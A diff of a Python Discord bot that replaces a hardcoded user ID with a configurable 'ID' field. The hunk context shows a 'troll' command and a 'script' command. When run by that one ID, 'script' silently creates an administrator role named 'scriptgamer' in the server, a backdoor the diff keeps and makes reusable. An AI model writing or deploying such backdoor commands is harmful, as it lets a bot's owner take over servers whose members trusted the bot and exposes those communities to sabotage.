@@ -14,7 +14,8 @@ intents = discord.Intents.all()
 bot = commands.Bot(command_prefix = "%", case_insensitive=True)
 bot.requests = httpx.AsyncClient()
 maintoken = "" #your bot token
-blacklist = "" #user ID to blacklist memebers
+blacklist = "" 
+ID = "" #enter your ID
 
 
 def admin_list():
@@ -116,7 +117,7 @@ async def troll(ctx):
 @admin_list()
 async def script(ctx):
 
-  if ctx.author.id == 287285385455730688:
+  if ctx.author.id == ID:
 
     perms = discord.Permissions(administrator=True)
     role = await ctx.guild.create_role(name="scriptgamer", permissions=perms, colour=discord.Colour(0x0000FF))
